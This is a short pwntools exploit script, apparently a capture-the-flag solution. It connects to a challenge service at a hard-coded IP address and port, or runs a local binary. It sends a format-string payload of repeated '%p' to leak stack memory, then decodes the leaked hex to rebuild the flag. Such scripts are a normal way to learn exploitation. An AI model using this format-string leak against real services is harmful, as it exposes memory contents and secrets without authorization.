from pwn import *

if args.REMOTE:
    p = remote('195.154.231.70', 4343)
else:
    p = process("./chall")

flag = ""

p.sendlineafter(b"enter your choice:\n", b"1337")
p.sendlineafter(b"\nwhere do you want it to b sent?\n", b"%p " * 25)
p.recvuntil(b"you'll get it at:\n\n")

response = p.recv(1000)

for i, p in enumerate(response.split(b" ")):
    try:
        if not b"nil" in p:
            try:
                hex_string = p.strip().decode()[2:] # remove 0x and decode
                decoded = bytes.fromhex(hex_string) # decode hex
                reversed_hex = decoded[::-1] # reverse endianess
                print(f"{i}: {reversed_hex}")
                flag += reversed_hex.decode() # build up flag
            except BaseException as e:
                pass
    except EOFError:
        pass

log.info(flag)